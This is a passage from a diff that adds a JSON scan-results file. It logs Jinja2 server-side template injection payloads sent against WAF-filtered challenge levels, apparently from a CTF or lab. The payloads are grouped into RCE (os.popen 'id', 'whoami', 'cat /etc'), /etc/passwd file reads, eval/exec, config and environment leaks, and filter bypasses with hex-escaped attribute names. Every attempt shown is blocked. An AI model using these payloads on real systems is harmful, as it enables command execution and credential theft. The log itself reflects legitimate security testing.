+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"__i",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "file_read": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"ope",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{get_flashed_messages.__globals__[\"__builtins__\"][\"open\"](\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{lipsum.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\").",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{url_for.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\")",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "eval": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"exe",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "bypass": [
+        {
+          "payload": "{{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{()|attr(\"\\x5f\\x5fclass\\x5f\\x5f\")|attr(\"\\x5f\\x5fmro\\x5f\\x5f",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{request|attr(\"application\")|attr(\"\\x5f\\x5fglobals\\x5f\\x5f\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{\"\"[\"__class__\"][\"__mro__\"][2][\"__subclasses__\"]()}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config[\"__class__\"][\"__init__\"][\"__globals__\"][\"os\"][\"pope",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "vulnerable": false,
+      "has_rce": false,
+      "has_file_read": false,
+      "has_eval": false,
+      "has_config_leak": false
+    },
+    {
+      "level": 13,
+      "filter_info": "WAF 严格 - 过滤 _, ., \\, ', \", request, +, class, init, arg, config, app, self, [, ]",
+      "probe": {
+        "{{7*7}}": {
+          "response": "Hello 49",
+          "class": "SHORT"
+        },
+        "{{7*'7'}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{config}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{self}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{request}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{''.__class__}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{()|attr('__class__')}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      },
+      "config_leak": [
+        {
+          "payload": "{{config}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__['os'].environ}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{url_for.__globals__['current_app'].config}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "rce": [
+        {
+          "payload": "{{''.__class__.__mro__[2].__subclasses__()}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").re",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"ls\").re",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"whoami\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"__i",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "file_read": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"ope",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{get_flashed_messages.__globals__[\"__builtins__\"][\"open\"](\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{lipsum.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\").",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{url_for.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\")",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "eval": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"exe",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "bypass": [
+        {
+          "payload": "{{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{()|attr(\"\\x5f\\x5fclass\\x5f\\x5f\")|attr(\"\\x5f\\x5fmro\\x5f\\x5f",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{request|attr(\"application\")|attr(\"\\x5f\\x5fglobals\\x5f\\x5f\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{\"\"[\"__class__\"][\"__mro__\"][2][\"__subclasses__\"]()}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config[\"__class__\"][\"__init__\"][\"__globals__\"][\"os\"][\"pope",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "vulnerable": false,
+      "has_rce": false,
+      "has_file_read": false,
+      "has_eval": false,
+      "has_config_leak": false
+    }
+  ]
+}
